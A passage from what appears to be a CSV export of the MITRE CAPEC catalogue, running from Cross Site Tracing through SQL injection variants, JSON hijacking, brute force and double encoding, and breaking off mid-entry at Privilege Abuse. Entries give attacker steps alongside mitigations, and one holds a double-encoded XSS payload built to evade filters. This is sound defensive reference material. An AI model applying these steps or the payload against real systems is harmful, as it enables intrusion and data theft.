response.::STEP:4:PHASE:Exploit:DESCRIPTION:[Execute malicious HTTP Trace launching script] The adversary leverages an XSS vulnerability to force the victim to execute the malicious HTTP Trace launching script::STEP:5:PHASE:Exploit:DESCRIPTION:[Intercept HTTP TRACE response] The adversary's script intercepts the HTTP TRACE response from teh web server, glance sensitive information from it, and forward that information to a server controlled by the adversary.::",::HTTP TRACE is enabled on the web server::The destination system is susceptible to XSS or an adversary can leverage some other weakness to bypass the same origin policy::Scripting is enabled in the client's browser::HTTP is used as the communication protocol between the server and the client::,::SKILL:Understanding of the HTTP protocol and an ability to craft a malicious script:LEVEL:Medium::,::None: No specialized resources are required to execute this type of attack.::,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::,::Administrators should disable support for HTTP TRACE at the destination's web server. Vendors should disable TRACE by default.::Patch web browser against known security origin policy bypass exploits.::,"::An adversary determines that a particular system is vulnerable to reflected cross-site scripting (XSS) and endeavors to leverage this weakness to steal the victim's authentication cookie. An adversary realizes that since httpOnly attribute is set on the user's cookie, it is not possible to steal it directly with their malicious script. Instead, the adversary has their script use XMLHTTP ActiveX control in the victim's IE browser to issue an HTTP TRACE to the target system's server which has HTTP TRACE enabled. The original HTTP TRACE request contains the session cookie and so does the echoed response. The adversary picks the session cookie from the body of HTTP TRACE response and ships it to the adversary. The adversary then uses the newly acquired victim's session cookie to impersonate the victim in the target system. In the absence of an XSS weakness on the site with which the victim is interacting, an adversary can get the script to come from the site that they control and get it to execute in the victim's browser (if they can trick the victim's into visiting their malicious website or clicking on the link that they supplies). However, in that case, due to the same origin policy protection mechanism in the browser, the adversary's malicious script cannot directly issue an HTTP TRACE request to the destination system's web server because the malicious script did not originate at that domain. An adversary will then need to find a way to exploit another weakness that would enable them to circumvent the same origin policy protection.::",::693::648::,TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Cross Site Tracing::,N/A,https://capec.mitre.org/data/definitions/107.html
CAPEC-108,Command Line Execution through SQL Injection,Detailed,Draft,"An attacker uses standard SQL injection methods to inject data into the command line for execution. This could be done directly through misuse of directives such as MSSQL_xp_cmdshell or indirectly through injection of data into the database that would be interpreted as shell commands. Sometime later, an unscrupulous backend application (or could be part of the functionality of the same application) fetches the injected data stored in the database and uses this data as command line arguments without performing proper validation. The malicious data escapes that data plane by spawning new commands to be executed on the host.",N/A,Low,Very High,::NATURE:ChildOf:CAPEC ID:66::,::STEP:1:PHASE:Explore:DESCRIPTION:[Probe for SQL Injection vulnerability] The attacker injects SQL syntax into user-controllable data inputs to search unfiltered execution of the SQL syntax in a query.::STEP:2:PHASE:Exploit:DESCRIPTION:[Achieve arbitrary command execution through SQL Injection with the MSSQL_xp_cmdshell directive] The attacker leverages a SQL Injection attack to inject shell code to be executed by leveraging the xp_cmdshell directive.::STEP:3:PHASE:Exploit:DESCRIPTION:[Inject malicious data in the database] Leverage SQL injection to inject data in the database that could later be used to achieve command injection if ever used as a command line argument::STEP:4:PHASE:Exploit:DESCRIPTION:[Trigger command line execution with injected arguments] The attacker causes execution of command line functionality which leverages previously injected database content as arguments.::,::The application does not properly validate data before storing in the database::Backend application implicitly trusts the data stored in the database::Malicious data is used on the backend as a command line argument::,"::SKILL:The attacker most likely has to be familiar with the internal functionality of the system to launch this attack. Without that knowledge, there are not many feedback mechanisms to give an attacker the indication of how to perform command injection or whether the attack is succeeding.:LEVEL:High::",::None: No specialized resources are required to execute this type of attack.::,N/A,::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::,::Disable MSSQL xp_cmdshell directive on the database::Properly validate the data (syntactically and semantically) before writing it to the database.::Do not implicitly trust the data stored in the database. Re-validate it prior to usage to make sure that it is safe to use in a given context (e.g. as a command line argument).::,"::SQL injection vulnerability in Cacti 0.8.6i and earlier, when register_argc_argv is enabled, allows remote attackers to execute arbitrary SQL commands via the (1) second or (2) third arguments to cmd.php. NOTE: this issue can be leveraged to execute arbitrary commands since the SQL query results are later used in the polling_items array and popen function (CVE-2006-6799). Reference: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-6799::",::89::74::20::78::114::,N/A,N/A,https://capec.mitre.org/data/definitions/108.html
CAPEC-109,Object Relational Mapping Injection,Detailed,Draft,"An attacker leverages a weakness present in the database access layer code generated with an Object Relational Mapping (ORM) tool or a weakness in the way that a developer used a persistence framework to inject their own SQL commands to be executed against the underlying database. The attack here is similar to plain SQL injection, except that the application does not use JDBC to directly talk to the database, but instead it uses a data access layer generated by an ORM tool or framework (e.g. Hibernate). While most of the time code generated by an ORM tool contains safe access methods that are immune to SQL injection, sometimes either due to some weakness in the generated code or due to the fact that the developer failed to use the generated access methods properly, SQL injection is still possible.",N/A,Low,High,::NATURE:ChildOf:CAPEC ID:66::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine Persistence Framework Used] An attacker tries to determine what persistence framework is used by the application in order to leverage a weakness in the generated data access layer code or a weakness in a way that the data access layer may have been used by the developer.TECHNIQUE:An attacker provides input to the application in an attempt to induce an error screen that reveals a stack trace that gives an indication of the automated data access layer used. Or an attacker may simply make some educated guesses and assume, for instance, that Hibernate is used and try to craft an attack from there.::STEP:2:PHASE:Explore:DESCRIPTION:[Probe for ORM Injection vulnerabilities] The attacker injects ORM syntax into user-controllable data inputs of the application to determine if it is possible modify data query structure and content.::STEP:3:PHASE:Exploit:DESCRIPTION:[Perform SQL Injection through the generated data access layer] An attacker proceeds to exploit a weakness in the generated data access methods that does not properly separate control plane from the data plan, or potentially a particular way in which developer might have misused the generated code, to modify the structure of the executed SQL queries and/or inject entirely new SQL queries.TECHNIQUE:An attacker uses normal SQL injection techniques and adjusts them to reflect the type of data access layer generation framework used by the application.::","::An application uses data access layer generated by an ORM tool or framework::An application uses user supplied data in queries executed against the database::The separation between data plane and control plane is not ensured, through either developer error or an underlying weakness in the data access layer code generation framework::",::SKILL:Knowledge of general SQL injection techniques and subtleties of the ORM framework is needed:LEVEL:Medium::,::None: No specialized resources are required to execute this type of attack.::,N/A,::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::,::Remember to understand how to use the data access methods generated by the ORM tool / framework properly in a way that would leverage the built-in security mechanisms of the framework::Ensure to keep up to date with security relevant updates to the persistence framework used within your application.::,"::When using Hibernate, it is possible to use the session.find() method to run queries against the database. This is an overloaded method that provides facilities to perform binding between the supplied user data and place holders in the statically defined query. However, it is also possible to use the session.find() method without using any of these query binding overloads, hence effectively concatenating the user supplied data with rest of the SQL query, resulting in a possibility for SQL injection. While the framework may provide mechanisms to use methods immune to SQL injections, it may also contain ways that are not immune that may be chosen by the developer.::",::20::89::564::,N/A,N/A,https://capec.mitre.org/data/definitions/109.html
CAPEC-110,SQL Injection through SOAP Parameter Tampering,Detailed,Draft,"An attacker modifies the parameters of the SOAP message that is sent from the service consumer to the service provider to initiate a SQL injection attack. On the service provider side, the SOAP message is parsed and parameters are not properly validated before being used to access a database in a way that does not use parameter binding, thus enabling the attacker to control the structure of the executed SQL query. This pattern describes a SQL injection attack with the delivery mechanism being a SOAP message.",N/A,High,Very High,::NATURE:ChildOf:CAPEC ID:66::NATURE:CanPrecede:CAPEC ID:108::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Detect Incorrect SOAP Parameter Handling] The attacker tampers with the SOAP message parameters and looks for indications that the tampering caused a change in behavior of the targeted application.TECHNIQUE:The attacker tampers with the SOAP message parameters by injecting some special characters such as single quotes, double quotes, semi columns, etc. The attacker observes system behavior.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe for SQL Injection vulnerability] The attacker injects SQL syntax into vulnerable SOAP parameters identified during the Explore phase to search for unfiltered execution of the SQL syntax in a query.::STEP:3:PHASE:Exploit:DESCRIPTION:[Inject SQL via SOAP Parameters] The attacker injects SQL via SOAP parameters identified as vulnerable during Explore phase to launch a first or second order SQL injection attack.TECHNIQUE:An attacker performs a SQL injection attack via the usual methods leveraging SOAP parameters as the injection vector. An attacker has to be careful not to break the XML parser at the service provider which may prevent the payload getting through to the SQL query. The attacker may also look at the WSDL for the web service (if available) to better understand what is expected by the service provider.::",::SOAP messages are used as a communication mechanism in the system::SOAP parameters are not properly validated at the service provider::The service provider does not properly utilize parameter binding when building SQL queries::,::SKILL:If the attacker is able to gain good understanding of the system's database schema:LEVEL:Medium::SKILL:If the attacker has to perform Blind SQL Injection:LEVEL:High::,::None: No specialized resources are required to execute this type of attack.::,N/A,::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::,"::Properly validate and sanitize/reject user input at the service provider.::Ensure that prepared statements or other mechanism that enables parameter binding is used when accessing the database in a way that would prevent the attackers' supplied data from controlling the structure of the executed query.::At the database level, ensure that the database user used by the application in a particular context has the minimum needed privileges to the database that are needed to perform the operation. When possible, run queries against pre-generated views rather than the tables directly.::","::An attacker uses a travel booking system that leverages SOAP communication between the client and the travel booking service. An attacker begins to tamper with the outgoing SOAP messages by modifying their parameters to include characters that would break a dynamically constructed SQL query. They notice that the system fails to respond when these malicious inputs are injected in certain parameters transferred in a SOAP message. The attacker crafts a SQL query that modifies their payment amount in the travel system's database and passes it as one of the parameters . A backend batch payment system later fetches the payment amount from the database (the modified payment amount) and sends to the credit card processor, enabling the attacker to purchase the airfare at a lower price. An attacker needs to have some knowledge of the system's database, perhaps by exploiting another weakness that results in information disclosure.::",::89::20::,N/A,N/A,https://capec.mitre.org/data/definitions/110.html
CAPEC-111,JSON Hijacking (aka JavaScript Hijacking),Standard,Draft,An attacker targets a system that uses JavaScript Object Notation (JSON) as a transport mechanism between the client and the server (common in Web 2.0 systems using AJAX) to steal possibly confidential information transmitted from the server back to the client inside the JSON object by taking advantage of the loophole in the browser's Same Origin Policy that does not prohibit JavaScript from one website to be included and executed in the context of another website.,N/A,High,High,::NATURE:ChildOf:CAPEC ID:212::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Understand How to Request JSON Responses from the Target System] An attacker first explores the target system to understand what URLs need to be provided to it in order to retrieve JSON objects that contain information of interest to the attacker.TECHNIQUE:An attacker creates an account with the target system and observes requests and the corresponding JSON responses from the server. Understanding how to properly elicit responses from the server is crucial to the attackers' ability to craft the exploit.::STEP:2:PHASE:Experiment:DESCRIPTION:[Craft a malicious website]The attacker crafts a malicious website to which they plan to lure the victim who is using the vulnerable target system. The malicious website does two things: 1. Contains a hook that intercepts incoming JSON objects, reads their contents and forwards the contents to the server controlled by the attacker (via a new XMLHttpRequest). 2. Uses the script tag with a URL in the source that requests a JSON object from the vulnerable target system. Once the JSON object is transmitted to the victim's browser, the malicious code (as described in step 1) intercepts that JSON object, steals its contents, and forwards to the attacker. This attack step leverages the fact that the same origin policy in the browser does not protect JavaScript originating from one domain from setting up an environment to intercept and access JSON objects arriving from a completely different domain.::STEP:3:PHASE:Exploit:DESCRIPTION:[Launch JSON hijack] An attacker lures the victim to the malicious website or leverages other means to get their malicious code executing in the victim's browser. Once that happens, the malicious code makes a request to the victim target system to retrieve a JSON object with sensitive information. The request includes the victim's session cookie if the victim is logged in.TECHNIQUE:An attacker employs a myriad of standard techniques to get the victim to visit their malicious site or by some other means get the attackers' malicious code executing in the victim's browser.::",::JSON is used as a transport mechanism between the client and the server::The target server cannot differentiate real requests from forged requests::The JSON object returned from the server can be accessed by the attackers' malicious code via a script tag::,"::SKILL:Once this attack pattern is developed and understood, creating an exploit is not very complex.The attacker needs to have knowledge of the URLs that need to be accessed on the target system to request the JSON objects.:LEVEL:Medium::",::None: No specialized resources are required to execute this type of attack.::,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::,"::Ensure that server side code can differentiate between legitimate requests and forged requests. The solution is similar to protection against Cross Site Request Forger (CSRF), which is to use a hard to guess random nonce (that is unique to the victim's session with the server) that the attacker has no way of knowing (at least in the absence of other weaknesses). Each request from the client to the server should contain this nonce and the server should reject all requests that do not contain the nonce.::On the client side, the system's design could make it difficult to get access to the JSON object content via the script tag. Since the JSON object is never assigned locally to a variable, it cannot be readily modified by the attacker before being used by a script tag. For instance, if while(1) was added to the beginning of the JavaScript returned by the server, trying to access it with a script tag would result in an infinite loop. On the other hand, legitimate client side code can remove the while(1) statement after which the JavaScript can be evaluated. A similar result can be achieved by surrounding the returned JavaScript with comment tags, or using other similar techniques (e.g. wrapping the JavaScript with HTML tags).::Make the URLs in the system used to retrieve JSON objects unpredictable and unique for each user session.::Ensure that to the extent possible, no sensitive data is passed from the server to the client via JSON objects. JavaScript was never intended to play that role, hence the same origin policy does not adequate address this scenario.::","::Gmail service was found to be vulnerable to a JSON Hijacking attack that enabled an attacker to get the contents of the victim's address book. An attacker could send an e-mail to the victim's Gmail account (which ensures that the victim is logged in to Gmail when they receive it) with a link to the attackers' malicious site. If the victim clicked on the link, a request (containing the victim's authenticated session cookie) would be sent to the Gmail servers to fetch the victim's address book. This functionality is typically used by the Gmail service to get this data on the fly so that the user can be provided a list of contacts from which to choose the recipient of the e-mail. When the JSON object with the contacts came back, it was loaded into the JavaScript space via a script tag on the attackers' malicious page. Since the JSON object was never assigned to a local variable (which would have prevented a script from a different domain accessing it due to the browser's same origin policy), another mechanism was needed to access the data that it contained. That mechanism was overwriting the internal array constructor with the attackers' own constructor in order to gain access to the JSON object's contents. These contents could then be transferred to the site controlled by the attacker.::",::345::346::352::,N/A,N/A,https://capec.mitre.org/data/definitions/111.html
CAPEC-112,Brute Force,Meta,Draft,"In this attack, some asset (information, functionality, identity, etc.) is protected by a finite secret value. The attacker attempts to gain access to this asset by using trial-and-error to exhaustively explore all the possible secret values in the hope of finding the secret (or a value that is functionally equivalent) that will unlock the asset.",N/A,N/A,High,N/A,"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine secret testing procedure] Determine how a potential guess of the secret may be tested. This may be accomplished by comparing some manipulation of the secret to a known value, use of the secret to manipulate some known set of data and determining if the result displays specific characteristics (for example, turning cryptotext into plaintext), or by submitting the secret to some external authority and having the external authority respond as to whether the value was the correct secret. Ideally, the attacker will want to determine the correctness of their guess independently since involvement of an external authority is usually slower and can provide an indication to the defender that a brute-force attack is being attempted.TECHNIQUE:Determine if there is a way to parallelize the attack. Most brute force attacks can take advantage of parallel techniques by dividing the search space among available resources, thus dividing the average time to success by the number of resources available. If there is a single choke point, such as a need to check answers with an external authority, the attackers' position is significantly degraded.::STEP:2:PHASE:Explore:DESCRIPTION:[Reduce search space] Find ways to reduce the secret space. The smaller the attacker can make the space they need to search for the secret value, the greater their chances for success. There are a great many ways in which the search space may be reduced.TECHNIQUE:If possible, determine how the secret was selected. If the secret was determined algorithmically (such as by a random number generator) the algorithm may have patterns or dependencies that reduce the size of the secret space. If the secret was created by a human, behavioral factors may, if not completely reduce the space, make some types of secrets more likely than others. (For example, humans may use the same secrets in multiple places or use secrets that look or sound familiar for ease of recall.):TECHNIQUE:If the secret was chosen algorithmically, cryptanalysis can be applied to the algorithm to discover patterns in this algorithm. (This is true even if the secret is not used in cryptography.) Periodicity, the need for seed values, or weaknesses in the generator all can result in a significantly smaller secret space.:TECHNIQUE:If the secret was chosen by a person, social engineering and simple espionage can indicate patterns in their secret selection. If old secrets can be learned (and a target may feel they have little need to protect a secret that has been replaced) hints as to their selection preferences can be gleaned. These can include character substitutions a target employs, patterns in sources (dates, famous phrases, music lyrics, family members, etc.). Once these patterns have been determined, the initial efforts of a brute-force attack can focus on these areas.:TECHNIQUE:Some algorithmic techniques for secret selection may leave indicators that can be tested for relatively easily and which could then be used to eliminate large areas of the search space for consideration. For example, it may be possible to determine that a secret does or does not start with a given character after a relatively small number of tests. Alternatively, it might be possible to discover the length of the secret relatively easily. These discoveries would significantly reduce the search space, thus increasing speed with which the attacker discovers the secret.::STEP:3:PHASE:Explore:DESCRIPTION:[Expand victory conditions] It is sometimes possible to expand victory conditions. For example, the attacker might not need to know the exact secret but simply needs a value that produces the same result using a one-way function. While doing this does not reduce the size of the search space, the presence of multiple victory conditions does reduce the likely amount of time that the attacker will need to explore the space before finding a workable value.::STEP:4:PHASE:Exploit:DESCRIPTION:[Gather information so attack can be performed independently.] If possible, gather the necessary information so a successful search can be determined without consultation of an external authority. This can be accomplished by capturing cryptotext (if the goal is decoding the text) or the encrypted password dictionary (if the goal is learning passwords).::","::The attacker must be able to determine when they have successfully guessed the secret. As such, one-time pads are immune to this type of attack since there is no way to determine when a guess is correct.::",::SKILL:The attack simply requires basic scripting ability to automate the exploration of the search space. More sophisticated attackers may be able to use more advanced methods to reduce the search space and increase the speed with which the secret is located.:LEVEL:Low::,"::None: No specialized resources are required to execute this type of attack. Ultimately, the speed with which an attacker discovers a secret is directly proportional to the computational resources the attacker has at their disposal. This attack method is resource expensive: having large amounts of computational power do not guarantee timely success, but having only minimal resources makes the problem intractable against all but the weakest secret selection procedures.::","::Repeated submissions of incorrect secret values may indicate a brute force attack. For example, repeated bad passwords when accessing user accounts or repeated queries to databases using non-existent keys.::Attempts to download files protected by secrets (usually using encryption) may be a precursor to an offline attack to break the file's encryption and read its contents. This is especially significant if the file itself contains other secret values, such as password files.::If the attacker is able to perform the checking offline then there will likely be no indication that an attack is ongoing.::",::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::,"::Select a provably large secret space for selection of the secret. Provably large means that the procedure by which the secret is selected does not have artifacts that significantly reduce the size of the total secret space.::Use a secret space that is well known and with no known patterns that may reduce functional size.::Do not provide the means for an attacker to determine success independently. This forces the attacker to check their guesses against an external authority, which can slow the attack and warn the defender. This mitigation may not be possible if testing material must appear externally, such as with a transmitted cryptotext.::",N/A,::330::326::521::,TAXONOMY NAME:WASC:ENTRY ID:11:ENTRY NAME:Brute Force::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Brute force attack::,N/A,https://capec.mitre.org/data/definitions/112.html
CAPEC-114,Authentication Abuse,Meta,Draft,"An attacker obtains unauthorized access to an application, service or device either through knowledge of the inherent weaknesses of an authentication mechanism, or by exploiting a flaw in the authentication scheme's implementation. In such an attack an authentication mechanism is functioning but a carefully controlled sequence of events causes the mechanism to grant access to the attacker.",N/A,N/A,Medium,N/A,N/A,"::An authentication mechanism or subsystem implementing some form of authentication such as passwords, digest authentication, security certificates, etc. which is flawed in some way.::",N/A,"::A client application, command-line access to a binary, or scripting language capable of interacting with the authentication mechanism.::",N/A,N/A,N/A,N/A,::287::1244::,TAXONOMY NAME:ATTACK:ENTRY ID:1548:ENTRY NAME:Abuse Elevation Control Mechanism::,N/A,https://capec.mitre.org/data/definitions/114.html
CAPEC-115,Authentication Bypass,Meta,Draft,"An attacker gains access to application, service, or device with the privileges of an authorized or privileged user by evading or circumventing an authentication mechanism. The attacker is therefore able to access protected data without authentication ever having taken place.",N/A,N/A,Medium,N/A,N/A,"::An authentication mechanism or subsystem implementing some form of authentication such as passwords, digest authentication, security certificates, etc.::",N/A,"::A client application, such as a web browser, or a scripting language capable of interacting with the target.::",N/A,N/A,N/A,N/A,::287::,TAXONOMY NAME:ATTACK:ENTRY ID:1548:ENTRY NAME:Abuse Elevation Control Mechanism::,N/A,https://capec.mitre.org/data/definitions/115.html
CAPEC-116,Excavation,Meta,Stable,"An adversary actively probes the target in a manner that is designed to solicit information that could be leveraged for malicious purposes. This is achieved by exploring the target via ordinary interactions for the purpose of gathering intelligence about the target, or by sending data that is syntactically invalid or non-standard in an attempt to produce a response that contains the desired data. As a result of these interactions, the adversary is able to obtain information from the target that aids the attacker in making inferences about its security, configuration, or potential vulnerabilities. Examplar exchanges with the target may trigger unhandled exceptions or verbose error messages that reveal information like stack traces, configuration information, path information, or database design. This type of attack also includes the manipulation of query strings in a URI to produce invalid SQL queries, or by trying alternative path values in the hope that the server will return useful information.",N/A,High,Medium,::NATURE:CanPrecede:CAPEC ID:163::,N/A,::An adversary requires some way of interacting with the system.::,N/A,"::A tool, such as an Adversary in the Middle (CAPEC-94) Proxy or a fuzzer, that is capable of generating and injecting custom inputs to be used in the attack.::",N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::,::Minimize error/response output to only what is necessary for functional use or corrective language.::Remove potentially sensitive information that is not necessary for the application's functionality.::,N/A,::200::1243::,N/A,"TYPE:Other:NOTE:Large quantities of data is often moved from the target system to some other adversary controlled system. Data found on a target system might require extensive resources to be fully analyzed. Using these resources on the target system might enable a defender to detect the adversary. Additionally, proper analysis tools required might not be available on the target system.::::TYPE:Other:NOTE:This attack differs from Data Interception and other data collection attacks in that the attacker actively queries the target rather than simply watching for the target to reveal information.::",https://capec.mitre.org/data/definitions/116.html
CAPEC-117,Interception,Meta,Stable,"An adversary monitors data streams to or from the target for information gathering purposes. This attack may be undertaken to solely gather sensitive information or to support a further attack against the target. This attack pattern can involve sniffing network traffic as well as other types of data streams (e.g. radio). The adversary can attempt to initiate the establishment of a data stream or passively observe the communications as they unfold. In all variants of this attack, the adversary is not the intended recipient of the data stream. In contrast to other means of gathering information (e.g., targeting data leaks), the adversary must actively position themself so as to observe explicit data channels (e.g. network traffic) and read the content. However, this attack differs from a Adversary-In-the-Middle (CAPEC-94) attack, as the adversary does not alter the content of the communications nor forward data to the intended recipient.",N/A,Low,Medium,N/A,N/A,::The target must transmit data over a medium that is accessible to the adversary.::,N/A,"::The adversary must have the necessary technology to intercept information passing between the nodes of a network. For TCP/IP, the capability to run tcpdump, ethereal, etc. can be useful. Depending upon the data being targeted the technological requirements will change.::",N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::,::Leverage encryption to encode the transmission of data thus making it accessible only to authorized parties.::,N/A,::319::,N/A,N/A,https://capec.mitre.org/data/definitions/117.html
CAPEC-12,Choosing Message Identifier,Standard,Draft,"This pattern of attack is defined by the selection of messages distributed via multicast or public information channels that are intended for another client by determining the parameter value assigned to that client. This attack allows the adversary to gain access to potentially privileged information, and to possibly perpetrate other attacks through the distribution means by impersonation. If the channel/message being manipulated is an input rather than output mechanism for the system, (such as a command bus), this style of attack could be used to change the adversary's identifier to more a privileged one.",N/A,High,High,::NATURE:PeerOf:CAPEC ID:21::NATURE:ChildOf:CAPEC ID:216::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine Nature of Messages] Determine the nature of messages being transported as well as the identifiers to be used as part of the attack::STEP:2:PHASE:Experiment:DESCRIPTION:[Authenticate] If required, authenticate to the distribution channel::STEP:3:PHASE:Experiment:DESCRIPTION:[Identify Known Client Identifiers] If any particular client's information is available through a control channel available to all users, the adversary will discover particular identifiers for targeted clients by observing this channel, or requesting client information through this channel.::STEP:4:PHASE:Experiment:DESCRIPTION:[Change Message Identifier] Adversaries with client access connecting to output channels could change their channel identifier and see someone else's (perhaps more privileged) data.::","::Information and client-sensitive (and client-specific) data must be present through a distribution channel available to all users.::Distribution means must code (through channel, message identifiers, or convention) message destination in a manner visible within the distribution means itself (such as a control channel) or in the messages themselves.::",::SKILL:All the adversary needs to discover is the format of the messages on the channel/distribution means and the particular identifier used within the messages.:LEVEL:Low::,::The adversary needs the ability to control source code or application configuration responsible for selecting which message/channel id is absorbed from the public distribution means.::,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::,"::Associate some ACL (in the form of a token) with an authenticated user which they provide middleware. The middleware uses this token as part of its channel/message selection for that client, or part of a discerning authorization decision for privileged channels/messages. The purpose is to architect the system in a way that associates proper authentication/authorization with each channel/message.::Re-architect system input/output channels as appropriate to distribute self-protecting data. That is, encrypt (or otherwise protect) channels/messages so that only authorized readers can see them.::","::A certain B2B interface on a large application codes for messages passed over an MQSeries queue, on a single Partners channel. Messages on that channel code for their client destination based on a partner_ID field, held by each message. That field is a simple integer. Adversaries having access to that channel, perhaps a particularly nosey partner, can simply choose to store messages of another partner's ID and read them as they desire. Note that authentication does not prevent a partner from leveraging this attack on other partners. It simply disallows adversaries without partner status from conducting this attack.::",::201::306::,N/A,N/A,https://capec.mitre.org/data/definitions/12.html
CAPEC-120,Double Encoding,Detailed,Draft,"The adversary utilizes a repeating of the encoding process for a set of characters (that is, character encoding a character encoding of a character) to obfuscate the payload of a particular request. This may allow the adversary to bypass filters that attempt to detect illegal characters or strings, such as those that might be used in traversal or injection attacks. Filters may be able to catch illegal encoded strings, but may not catch doubly encoded strings. For example, a dot (.), often used in path traversal attacks and therefore often blocked by filters, could be URL encoded as %2E. However, many filters recognize this encoding and would still block the request. In a double encoding, the % in the above URL encoding would be encoded again as %25, resulting in %252E which some filters might not catch, but which could still be interpreted as a dot (.) by interpreters on the target.",N/A,Low,Medium,::NATURE:ChildOf:CAPEC ID:267::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs] Using a browser, an automated tool or by inspecting the application, an attacker records all entry points to the application.TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.:TECHNIQUE:Manually inspect the application to find entry points.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe entry points to locate vulnerabilities] Try double-encoding for parts of the input in order to try to get past the filters. For instance, by double encoding certain characters in the URL (e.g. dots and slashes) an adversary may try to get access to restricted resources on the web server or force browse to protected pages (thus subverting the authorization service). An adversary can also attempt other injection style attacks using this attack pattern: command injection, SQL injection, etc.TECHNIQUE:Try to use double-encoding to bypass validation routines.::",::The target's filters must fail to detect that a character has been doubly encoded but its interpreting engine must still be able to convert a doubly encoded character to an un-encoded character.::The application accepts and decodes URL string request.::The application performs insufficient filtering/canonicalization on the URLs.::,N/A,::Tools that automate encoding of data can assist the adversary in generating encoded strings.::,N/A,N/A,"::Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist should not be permitted to enter into the system. Test your decoding process against malicious input.::Be aware of the threat of alternative method of data encoding and obfuscation technique such as IP address encoding.::When client input is required from web-based forms, avoid using the GET method to submit data, as the method causes the form data to be appended to the URL and is easily manipulated. Instead, use the POST method whenever possible.::Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process.::Refer to the RFCs to safely decode URL.::Regular expression can be used to match safe URL patterns. However, that may discard valid URL requests if the regular expression is too restrictive.::There are tools to scan HTTP requests to the server for valid URL such as URLScan from Microsoft (http://www.microsoft.com/technet/security/tools/urlscan.mspx).::","::Double Enconding Attacks can often be used to bypass Cross Site Scripting (XSS) detection and execute XSS attacks.: %253Cscript%253Ealert('This is an XSS Attack')%253C%252Fscript%253E Since <, <, and / are often sued to perform web attacks, these may be captured by XSS filters. The use of double encouding prevents the filter from working as intended and allows the XSS to bypass dectection. This can allow an adversary to execute malicious code.::",::173::172::177::181::183::184::74::20::697::692::,N/A,N/A,https://capec.mitre.org/data/definitions/120.html
CAPEC-122,Privilege Abuse,Meta,Draft,An adversary is able to exploit features of the target that should be reserved for privileged users or administrators but are exposed to use by lower or non-privileged accounts. Access to sensitive information and functionality must be controlled to ensure that only authorized users are able to access these resources.,N/A,High,Medium,::NATURE:CanPrecede:CAPEC ID:664::,N/A,"::The target must have misconfigured their access control mechanisms such that sensitive information, which should only be accessible to more trusted users, remains accessible to less trusted users.::The adversary must have access to the target, albeit with an account that is less privileged than would be appropriate for the targeted resources.::",::SKILL:Adversary can leverage privileged features they already have access to without additional effort or skill. Adversary is only required to have access to an account with improper priveleges.:LEVEL:Low::,::None: No specialized resources are required to execute this type of attack. The ability to access the target is required.::,N/A,::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Authorization Execute Unauthorized Commands Run Arbitrary Code::SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::,::Configure account privileges such privileged/administrator functionality is not exposed to non-privileged/lower accounts.::,"::Improperly configured account privileges allowed unauthorized users on a hospital's network to access the medical records for over 3,000 patients. 